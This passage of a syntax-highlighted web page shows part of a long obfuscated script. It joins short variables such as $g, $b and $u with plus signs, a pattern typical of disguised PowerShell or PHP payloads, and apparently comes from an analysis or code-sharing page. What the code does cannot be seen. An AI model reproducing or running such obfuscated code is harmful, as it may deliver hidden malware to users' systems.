class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span><span class="hljs-variable">$i</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span><span class="hljs-variable">$i</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$d</span><span class="hljs-variable">$d</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span 